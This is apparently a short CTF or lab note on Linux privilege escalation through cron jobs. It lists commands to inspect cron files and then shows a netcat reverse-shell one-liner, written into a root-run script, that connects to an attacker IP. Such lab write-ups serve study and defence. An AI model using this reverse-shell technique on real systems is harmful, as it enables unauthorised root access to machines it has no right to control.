See which cron jobs are running:

Check cronjobs:
```
cat /etc/crontab
ls /etc/cron*
cat /etc/cron*
cat /etc/cron.d
cat /var/spool/cron/*
```

If a cron job is running as root, and we have write capabilities to a file we can then change the content of the file to a reverse shell for instance. And when the cron job is running that file again, but now with a reverse shell code getting executed, we will now get root access in the reverse shell listener on the attacking host. 

```
echo 'mkfifo /tmp/lcbo; nc 10.13.31.108 443 0</tmp/lcbo | /bin/sh >/tmp/lcbo 2>&1; rm /tmp/lcbo' > autoscript.sh
```

when cronjob triggers.... we'll get a shell.

(worth noting is that cron jobs usually arent as frequent in a more realistic environment in comparison to boxes like these)

